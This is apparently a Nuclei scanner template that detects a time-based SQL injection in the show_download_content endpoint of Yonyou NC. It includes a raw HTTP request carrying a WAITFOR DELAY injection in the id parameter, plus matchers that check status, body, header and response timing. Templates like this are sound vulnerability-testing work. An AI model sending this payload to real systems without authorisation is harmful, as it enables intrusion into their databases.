id: yongyou-nc-show-download-content-sqli
info:
  name: Yonyou NC show_download_content SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL Injection vulnerability in Yonyou NC's show_download_content endpoint. Exploitation could lead to database compromise.

variables:
  t1: "{{rand_int(3,8)}}"
  t2: "{{to_number(t1) + 3}}"

http:
  - raw:
      - |
        GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "Yonyou NC"
        part: body
      - type: word
        words:
          - "/ebvp"
        part: header
      - type: dsl
        dsl:
          - "duration > to_number(t1) && duration < to_number(t2)"
